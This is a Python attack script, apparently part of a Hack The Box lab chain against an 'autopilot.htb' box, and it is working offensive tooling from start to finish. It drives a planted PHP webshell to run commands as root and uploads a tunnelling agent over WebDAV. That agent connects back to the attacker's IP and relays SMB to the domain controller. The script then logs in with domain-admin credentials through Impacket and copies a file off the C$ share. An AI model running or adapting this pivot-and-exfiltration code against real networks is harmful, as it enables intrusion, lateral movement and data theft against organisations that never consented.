#!/usr/bin/env python3
"""One-shot reverse SMB bridge: mail (ruid 0) → DC:445 → Impacket DA login → C$.

Requires 02+03 (webshell + sudo -n). secrets.env: DEB_PASS, DA_PASSWORD, KALI_IP.

    set -a && . ../secrets.env && set +a
    python3 09-dcpivot.py
"""
from __future__ import annotations

import os
import select
import shlex
import socket
import threading
from io import BytesIO

import requests
import urllib3
from requests.auth import HTTPBasicAuth

urllib3.disable_warnings()

from impacket.smbconnection import SMBConnection

BOX = "https://grommunio.autopilot.htb"
DEB_USER = os.environ.get("DEB_USER", "deborah.hernandez")
DEB_PASS = os.environ["DEB_PASS"]
WEBDIR = f"/var/lib/grommunio-files/data/{DEB_USER}/files"
WS = f"{BOX}/files/data/{DEB_USER}/files/s.php"
DAV = f"{BOX}/files/remote.php/dav/files/{DEB_USER}"
CALLBACK_IP = os.environ.get("KALI_IP") or os.environ["CALLBACK_IP"]
CALLBACK_PORT = int(os.environ.get("CALLBACK_PORT", "44445"))
FRONT_PORT = int(os.environ.get("FRONT_PORT", "14445"))
DC_IP = os.environ.get("DC01", "172.16.20.1")
DA_USER = os.environ.get("DA_USER", "da-stephanie.lewis")
DA_PASSWORD = os.environ["DA_PASSWORD"]
DOMAIN = os.environ.get("NETBIOS", "AUTOPILOT")
ROOT_PATH = r"Users\Administrator\Desktop\root.txt"
TOKEN = b"HTBAUTOPILOTBRID"
AGENT_REMOTE = "/var/tmp/smb_agent.py"
LOOT = os.environ.get("LOOT", "/tmp")

AGENT_SRC = f"""\
import select, socket, time
callback = ({CALLBACK_IP!r}, {CALLBACK_PORT})
destination = ({DC_IP!r}, 445)
token = {TOKEN!r}
with socket.create_connection(callback, timeout=15) as tunnel:
    try:
        remote = socket.create_connection(destination, timeout=15)
    except OSError:
        tunnel.sendall(token + b"\\x01")
        raise
    with remote:
        tunnel.sendall(token + b"\\x00")
        tunnel.settimeout(None)
        remote.settimeout(None)
        sockets = [tunnel, remote]
        deadline = time.monotonic() + 100
        while time.monotonic() < deadline:
            readable, _, _ = select.select(sockets, [], [], 1)
            for src in readable:
                data = src.recv(65536)
                if not data:
                    raise SystemExit(0)
                dst = remote if src is tunnel else tunnel
                dst.sendall(data)
"""


def root_exec(cmd: str, timeout: int = 40) -> str:
    wrapper = "/usr/bin/bash -p -c " + shlex.quote(cmd)
    r = requests.get(WS, params={"c": wrapper}, verify=False, timeout=timeout)
    text = r.text
    if "HTBOK" in text:
        text = text[: text.index("HTBOK")]
    return text


def pump(left: socket.socket, right: socket.socket, stop: threading.Event) -> None:
    try:
        left.settimeout(0.5)
        right.settimeout(0.5)
        while not stop.is_set():
            readable, _, _ = select.select((left, right), (), (), 0.5)
            for src in readable:
                try:
                    data = src.recv(65536)
                except (BlockingIOError, socket.timeout):
                    continue
                if not data:
                    return
                dst = right if src is left else left
                dst.sendall(data)
    except OSError:
        return
    finally:
        stop.set()
        for conn in (left, right):
            try:
                conn.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                conn.close()
            except OSError:
                pass


def main() -> None:
    print("[*] upload agent via WebDAV", flush=True)
    put = requests.put(
        DAV + "/smb_agent.py",
        data=AGENT_SRC.encode(),
        auth=HTTPBasicAuth(DEB_USER, DEB_PASS),
        verify=False,
        timeout=20,
    )
    print(f"    PUT HTTP {put.status_code}", flush=True)

    print("[*] copy to /var/tmp as root", flush=True)
    print(root_exec(f"cp {WEBDIR}/smb_agent.py {AGENT_REMOTE} && chmod 755 {AGENT_REMOTE} && ls -l {AGENT_REMOTE}"), flush=True)

    callback = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    callback.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    callback.bind((CALLBACK_IP, CALLBACK_PORT))
    callback.listen(1)
    callback.settimeout(45)
    print(f"[*] listening {CALLBACK_IP}:{CALLBACK_PORT}", flush=True)

    front = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    front.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    front.bind(("127.0.0.1", FRONT_PORT))
    front.listen(1)
    front.settimeout(25)

    cmd = (
        "sudo -n bash -c "
        "'setsid /usr/bin/timeout 110 /usr/bin/python3 "
        f"{AGENT_REMOTE} </dev/null >/var/tmp/smb_agent.log 2>&1 & echo PID=$!'"
    )
    print("[*] start agent (sudo -n setsid — systemd-run from SUID euid fails)", flush=True)
    print(root_exec(cmd), flush=True)

    print("[*] wait callback", flush=True)
    remote, addr = callback.accept()
    print(f"    from {addr}", flush=True)
    remote.settimeout(15)
    header = bytearray()
    while len(header) < 17:
        chunk = remote.recv(17 - len(header))
        if not chunk:
            raise SystemExit("bridge closed during handshake")
        header.extend(chunk)
    if bytes(header[:16]) != TOKEN:
        raise SystemExit(f"bad token {header[:16]!r}")
    if header[16] != 0:
        raise SystemExit("mail cannot connect to DC01:445")
    print("[+] DC01:445 reachable from mail", flush=True)
    remote.settimeout(None)

    stop = threading.Event()

    def accept_and_pump() -> None:
        try:
            local, _ = front.accept()
        except OSError:
            stop.set()
            return
        pump(local, remote, stop)

    threading.Thread(target=accept_and_pump, daemon=True).start()

    print("[*] Impacket login DA", flush=True)
    smb = SMBConnection("DC01", "127.0.0.1", sess_port=FRONT_PORT, timeout=20)
    try:
        smb.login(DA_USER, DA_PASSWORD, DOMAIN)
        print("[+] SMB login OK", flush=True)
        buf = BytesIO()
        smb.getFile("C$", ROOT_PATH, buf.write)
        os.makedirs(LOOT, exist_ok=True)
        out = os.path.join(LOOT, "root.txt")
        open(out, "wb").write(buf.getvalue().strip() + b"\n")
        print(f"[+] wrote {out} ({len(buf.getvalue().strip())} bytes, not printed)", flush=True)
    finally:
        try:
            smb.logoff()
        except Exception:
            pass
        stop.set()
        for s in (front, remote, callback):
            try:
                s.close()
            except OSError:
                pass


if __name__ == "__main__":
    main()
